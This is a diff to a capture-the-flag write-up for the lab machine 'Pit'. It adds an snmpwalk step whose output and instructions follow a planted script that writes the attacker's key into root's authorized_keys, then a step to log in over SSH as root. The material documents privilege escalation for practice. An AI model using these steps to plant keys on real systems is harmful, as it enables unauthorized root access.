@@ -340,7 +340,26 @@ So the following code is added to `/usr/local/monitoring` to add our public key 
 echo '<pit.pub>' > /root/.ssh/authorized_keys"**
 ```
 
-After that do the SNMP walk again.
+After that do the SNMP walk again. This time instead of running from the root, we can give OID.
+
+```bash
+ghost@localhost [01:31:37] [~/Documents/hacking/tj-null-boxes/pit] [master]
+-> % snmpwalk -v1 -c public pit.htb 1.3.6.1.4.1.8072
+
+iso.3.6.1.4.1.8072.1.3.2.1.0 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
+iso.3.6.1.4.1.8072.1.3.2.2.1.3.10.109.111.110.105.116.111.114.105.110.103 = ""
+iso.3.6.1.4.1.8072.1.3.2.2.1.4.10.109.111.110.105.116.111.114.105.110.103 = ""
+iso.3.6.1.4.1.8072.1.3.2.2.1.5.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 5
+iso.3.6.1.4.1.8072.1.3.2.2.1.6.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.2.1.7.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.2.1.20.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 4
+iso.3.6.1.4.1.8072.1.3.2.2.1.21.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.3.1.1.10.109.111.110.105.116.111.114.105.110.103 = STRING: "Memory usage"
+Timeout: No Response from pit.htb
+```
+
+Then ssh as root.
 
 ```bash
 ghost@localhost [01:11:48] [~/Documents/hacking/tj-null-boxes/pit] [master *]
